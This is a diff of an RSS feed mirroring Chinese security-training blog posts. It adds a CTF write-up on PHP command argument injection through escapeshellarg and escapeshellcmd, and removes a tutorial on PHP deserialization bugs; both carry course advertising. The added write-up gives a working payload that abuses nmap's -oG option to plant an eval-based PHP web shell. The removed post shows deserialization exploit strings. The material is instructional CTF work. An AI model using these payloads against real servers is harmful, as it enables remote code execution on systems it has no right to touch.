@@ -5,7 +5,43 @@
 <link>https://henix.github.io/feeds/zhuanlan.twosecurity/</link>
 <description>前沿、专业的网络空间攻防实训 专注于提供最前沿的网络空间安全攻防人才培养的解决方案。twosecurity.cn</description>
 <language>zh-cn</language>
-<lastBuildDate>Mon, 20 Jan 2020 02:23:39 +0800</lastBuildDate>
+<lastBuildDate>Mon, 20 Jan 2020 16:24:20 +0800</lastBuildDate>
+<item>
+<title>CTF|PHP中的命令参数注入</title>
+<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-20-103535020.html</link>
+<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103535020&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f5a67a5940ae10db7b96646c354ca864_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;直奔主题，首先来了解两个 PHP 函数的定义。&lt;/p&gt;&lt;h2&gt;命令参数注入&lt;/h2&gt;&lt;p&gt;&lt;b&gt;escapeshellarg&lt;/b&gt;&lt;/p&gt;&lt;p&gt;把字符串转码为可以在 shell 命令里使用的参数。&lt;/p&gt;&lt;p&gt;&lt;b&gt;escapeshellcmd&lt;/b&gt;&lt;/p&gt;&lt;p&gt;对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。&lt;/p&gt;&lt;p&gt;看上去似乎没什么毛病，escapeshellarg 与 escapeshellcmd 两个函数都是 php 设置来转义非法字符的，不过由于它们俩的转义规则有所不同，当先使用 escapeshellarg 再使用 escapeshellcmd 时，就可能导致命令参数注入。这是为什么呢？&lt;/p&gt;&lt;h2&gt;原理解析&lt;/h2&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;969&quot; data-rawheight=&quot;322&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;969&quot; data-original=&quot;https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;969&quot; data-rawheight=&quot;322&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;969&quot; data-original=&quot;https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;test.php&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;969&quot; data-rawheight=&quot;316&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;969&quot; data-original=&quot;https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;969&quot; data-rawheight=&quot;316&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;969&quot; data-original=&quot;https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;执行的语句将变成&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;curl &amp;#39;127.0.0.1&amp;#39;\\&amp;#39;&amp;#39; -v -d a=1\&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;相当于&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;curl 127.0.0.1\ -v -d a=1&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从而实现参数注入&lt;/p&gt;&lt;h2&gt;题目分析&lt;/h2&gt;&lt;p&gt;下面就以几道 CTF 题作为补充的讲解。&lt;/p&gt;&lt;p&gt;&lt;b&gt;题目1：[0 =&amp;gt; 0] === [0x100000000 =&amp;gt; 0]&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
+$user = [&amp;#39;admin&amp;#39;, &amp;#39;xxoo&amp;#39;];
+if(empty($_GET[&amp;#39;user&amp;#39;]))  die(show_souce(__FILE__));
+if($_GET[&amp;#39;user&amp;#39;] === $user &amp;amp;&amp;amp; $_GET[&amp;#39;user&amp;#39;][0] != &amp;#39;admin&amp;#39;){
+    echo $flag;
+} else {
+    die(&amp;#39;sketch_pl4ne_wants_a_girlfriend.&amp;#39;);
+}
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;分析&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这个实际上考的是索引数组的整数键截断&lt;/p&gt;&lt;p&gt;也就是：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//bugs.php.net/bug.php%3Fid%3D69892&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;bugs.php.net/bug.php?&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;id=69892&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1024&quot; data-rawheight=&quot;447&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1024&quot; data-original=&quot;https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1024&quot; data-rawheight=&quot;447&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1024&quot; data-original=&quot;https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;var_dump([0 =&amp;gt; 0] === [0x100000000 =&amp;gt; 0]); // bool(true)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;构造 payload&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;?user[4294967296]=admin&amp;amp;user[1]=xxoo
+//0x100000000 == 4294967296&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;该漏洞仅在 64 位的 php 中有效&lt;br/&gt;如何判断 32 位还是 64 位？&lt;br/&gt;查看 phpinfo() 即可知道。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;题目2：BUUCTF_2018_Online Tool&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
+
+if (isset($_SERVER[&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;])) {
+    $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] = $_SERVER[&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;];
+}
+
+if(!isset($_GET[&amp;#39;host&amp;#39;])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET[&amp;#39;host&amp;#39;];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    $sandbox = md5(&amp;#34;glzjin&amp;#34;. $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;]);
+    echo &amp;#39;you are in sandbox &amp;#39;.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    echo system(&amp;#34;nmap -T5 -sT -Pn --host-timeout 2 -F &amp;#34;.$host);
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;分析&lt;/b&gt;&lt;/p&gt;&lt;p&gt;直接代码审计吧，remote_addr 和 x_forwarded_for 这两个是服务器获取 ip 用的。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$host = escapeshellarg($host);
+$host = escapeshellcmd($host);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;前面说了，这两个 PHP 函数一起使用，会导致漏洞。&lt;/p&gt;&lt;p&gt;再后面 echo system(&amp;#34;nmap -T5 -sT -Pn --host-timeout 2 -F &amp;#34;.$host);&lt;/p&gt;&lt;p&gt;有个 system 来执行命令，而且有传参，这里应该就是突破口了。&lt;/p&gt;&lt;p&gt;nmap 可以做些什么呢？查阅相关资料后，发现一个 namp 参数 -oG 可以实现将命令和结果写到文件。&lt;/p&gt;&lt;p&gt;so，写入上传文件，直接一句话走起吧。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;?host=&amp;#39; &amp;lt;?php @eval($_POST[&amp;#34;hack&amp;#34;]);?&amp;gt; -oG hack.php &amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行后会返回文件夹名&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2872&quot; data-rawheight=&quot;112&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2872&quot; data-original=&quot;https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2872&quot; data-rawheight=&quot;112&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2872&quot; data-original=&quot;https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;连接一句话即可得到 flag。&lt;/p&gt;&lt;blockquote&gt;参考：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//bugs.php.net/bug.php%3Fid%3D69892&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;bugs.php.net/bug.php?&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;id=69892&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.php.net/manual/zh/function.escapeshellcmd.php&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;php.net/manual/zh/funct&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ion.escapeshellcmd.php&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包又更新了！学 Python 的也能当黑客了，多实战沉浸式体验，让你回味无穷。&lt;/p&gt;&lt;p&gt;这个春节，让你从 &lt;b&gt;程序猿→黑客x程序员 PLUS&lt;/b&gt;！&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
+<author>二向箔安全学院</author>
+<guid isPermaLink="false">2020-01-20-103535020</guid>
+<pubDate>Mon, 20 Jan 2020 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>python程序员也能当黑客</title>
 <link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-19-103476392.html</link>
@@ -214,96 +250,6 @@ $ sudo blackarch 安装&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;详细安�
 <author>二向箔安全学院</author>
 <guid isPermaLink="false">2020-01-13-102536299</guid>
 <pubDate>Mon, 13 Jan 2020 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>理解PHP反序列化漏洞</title>
-<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-10-102166928.html</link>
-<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102166928&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;很多小白可能都会有这样的疑惑，PHP 我知道，序列化我也知道，合在一起的 PHP 反序列化就搞不懂了。&lt;/p&gt;&lt;p&gt;今天就来破解 PHP 反序列化漏洞之谜。&lt;/p&gt;&lt;h2&gt;PHP序列化与反序列化&lt;/h2&gt;&lt;p&gt;首先，我们来理解，PHP 序列化与 PHP 反序列化这两个名词。&lt;/p&gt;&lt;blockquote&gt;序列化，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;serialize()&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;函数用于序列化对象或数组，并返回一个字符串。&lt;/blockquote&gt;&lt;p&gt;简单来说，序列化就是把一水果整齐的放在果盘里，比如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
-$sites = array(&amp;#39;a&amp;#39;, &amp;#39;bb&amp;#39;, &amp;#39;ccc&amp;#39;);
-$serialized_data = serialize($sites);
-echo  $serialized_data;
-?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果为：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;a:3:{i:0;s:1:&amp;#34;a&amp;#34;;i:1;s:2:&amp;#34;bb&amp;#34;;i:2;s:3:&amp;#34;ccc&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;o表示对象，a表示数组，s表示字符，i表示数字&lt;/blockquote&gt;&lt;p&gt;意思就是往果盘里面放了一个苹果、两个香蕉、三个梨，总共 3 类。&lt;/p&gt;&lt;p&gt;放入对象也是类似的。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
-class name1 {
-    var $test1;
-    var $test2;
-}
-$test3 = new name1;
-$test3-&amp;gt;test1 = &amp;#39;hi&amp;#39;;
-$test3-&amp;gt;test2 = &amp;#39;fun&amp;#39;;
-echo serialize($test3); &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:5:&amp;#34;name1&amp;#34;:2:{s:5:&amp;#34;test1&amp;#34;;s:2:&amp;#34;hi&amp;#34;;s:5:&amp;#34;test2&amp;#34;;s:3:&amp;#34;fun&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;unserialize()&lt;/b&gt;&lt;/p&gt;&lt;p&gt;单词前面加个“un”，大家都不陌生吧，就是跟前面相反的意思，把水果从果盘里面拿出来。&lt;/p&gt;&lt;p&gt;比如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
-$sites = array(&amp;#39;a&amp;#39;, &amp;#39;bb&amp;#39;, &amp;#39;ccc&amp;#39;);
-$serialized_data = serialize($sites);
-$unserialized_data = unserialize($serialized_data);
-print_r($unserialized_data);
-?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Array
-(
-    [0] =&amp;gt;  a
-    [1] =&amp;gt;  bb
-    [2] =&amp;gt;  ccc
-)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这就是 PHP 的反序列化，返回原始的结构。&lt;/p&gt;&lt;h2&gt;反序列化漏洞&lt;/h2&gt;&lt;p&gt;不就是放水果、拿水果吗？有什么危险的。&lt;/p&gt;&lt;p&gt;下面来介绍几种“果虫”，也就是危险的 PHP 魔法函数。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;construct():当一个类被创建时自动调用
-destruct():当一个类被销毁时自动调用
-invoke():当把一个类当作函数使用时自动调用
-tostring():当把一个类当作字符串使用时自动调用
-wakeup():当调用unserialize()函数时自动调用
-sleep():当调用serialize()函数时自动调用
-__call():当要调用的方法不存在或权限不足时自动调用&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;来看看是怎样祸害我们的水果的：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
-class chybeta{
-	var $test = &amp;#39;123&amp;#39;;
-	function __wakeup(){
-		echo &amp;#34;__wakeup&amp;#34;;
-		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
-	}
-	function __construct(){
-		echo &amp;#34;__construct&amp;#34;;
-		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
-	}
-	function __destruct(){
-		echo &amp;#34;__destruct&amp;#34;;
-		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
-	}
-}
-$class2 = &amp;#39;O:7:&amp;#34;chybeta&amp;#34;:1:{s:4:&amp;#34;test&amp;#34;;s:3:&amp;#34;123&amp;#34;;}&amp;#39;;
-	print_r($class2);
-echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
-$class2_unser = unserialize($class2);
-print_r($class2_unser);
-echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
-?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;162&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;471&quot; data-original=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;162&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;471&quot; data-original=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;unserialize() 反序列化之后，会导致 wakeup() 或 destruct() 的直接调用，因此最理想的情况就是一些漏洞/危害代码在 wakeup() 或 destruct() 中，从而当我们控制序列化字符串时可以去直接触发它们。&lt;/p&gt;&lt;p&gt;&lt;b&gt;绕过魔法函数&lt;/b&gt;&lt;/p&gt;&lt;p&gt;魔法函数 sleep() 和 wakeup()&lt;/p&gt;&lt;blockquote&gt;php 文档中定义 __wakeup():&lt;br/&gt;unserialize() 执行时会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。sleep() 则相反，是用在序列化一个对象时被调用.&lt;/blockquote&gt;&lt;p&gt;正常情况下的反序列化漏洞如下图：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1017&quot; data-rawheight=&quot;731&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1017&quot; data-original=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1017&quot; data-rawheight=&quot;731&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1017&quot; data-original=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;析构方法和 __wakeup 都能够执行&lt;/p&gt;&lt;p&gt;如果我们把传入的序列化字符串的属性个数更改成大于 1 的任何数&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:7:&amp;#34;hpdoger&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:6:&amp;#34;u know&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的结果如图，__wakeup 没有被执行，但是执行了析构函数&lt;/p&gt;&lt;h2&gt;CTF题实战&lt;/h2&gt;&lt;p&gt;&lt;b&gt;南邮CTF&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
-class just4fun { //定义了一个类
-    var $enter;
-    var $secret;
-}
-if (isset($_GET[&amp;#39;pass&amp;#39;])) {
-    $pass = $_GET[&amp;#39;pass&amp;#39;];
-
-    if(get_magic_quotes_gpc()){
-        $pass=stripslashes($pass);
-    }
-
-    $o = unserialize($pass); //进行反序列化处理
-
-    if ($o) {
-        $o-&amp;gt;secret = &amp;#34;*&amp;#34;; //这里不知道*代表的是啥
-        if ($o-&amp;gt;secret === $o-&amp;gt;enter) //要求$o中的两个属性值相同
-            echo &amp;#34;Congratulation! Here is my secret: &amp;#34;.$o-&amp;gt;secret;
-        else 
-            echo &amp;#34;Oh no... You can&amp;#39;t fool me&amp;#34;;
-    }
-    else echo &amp;#34;are you trolling?&amp;#34;;
-}
-?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;由于我们不知道 * 代表的是什么，所以用指针来直接让两个的属性相等。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
-class just4fun {
-    var $enter;
-    var $secret;
-}
-$o = new just4fun;
-$o-&amp;gt;enter = &amp;amp;$o-&amp;gt;secret; //这里的a=&amp;amp;b 即代表将b的指针赋值给a 无论b的值怎么变 a始终等于b
-echo serialize($o);
-?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;本地运行即可得到序列化字符串&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:8:&amp;#34;just4fun&amp;#34;:2:{s:5:&amp;#34;enter&amp;#34;;N;s:6:&amp;#34;secret&amp;#34;;R:2;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后将此作为 pass 参数 GET 发送即可获得 flag。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！无需登录、无需扫描，只需点击下方链接即可畅玩技能包。（CISP-PTE 技能包、CTF 技能包即将上线，敬请关注！）&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; 